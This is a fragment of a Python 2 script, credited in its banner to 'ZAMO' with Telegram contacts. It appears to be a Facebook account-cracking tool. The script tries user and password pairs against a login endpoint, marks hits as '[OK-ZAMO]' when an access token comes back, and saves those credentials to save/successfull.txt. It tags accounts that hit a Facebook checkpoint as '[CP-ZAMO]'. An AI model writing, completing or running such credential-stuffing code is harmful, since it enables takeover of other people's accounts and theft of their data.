...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
\033[36;1mCODE BY : ZAMO
\033[36;1mTELEGRAM: @zamo404
\033[32;1mCHANNEL : @staff1867
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'''
back = 0
successful = []
cpb = []
...
def menu():
    ...
    print '>>\x1b[1;92m TOOL BY ZAMO (ZAMO) \x1b[1;91m(\x1b[1;97mV1000\x1b[1;91m) '
    print 42 * '\x1b[1;91m='
    action()
...
def action():
    ...
    time.sleep(0.1)
    psb('TOLAKA BA HAMW XATI ZOR BASHA')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[OK-ZAMO]\x1b[1;95m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[CP-ZAMO]\x1b[1;96m ' + k + c + user + ' >>> ' + pass1 + '\n'
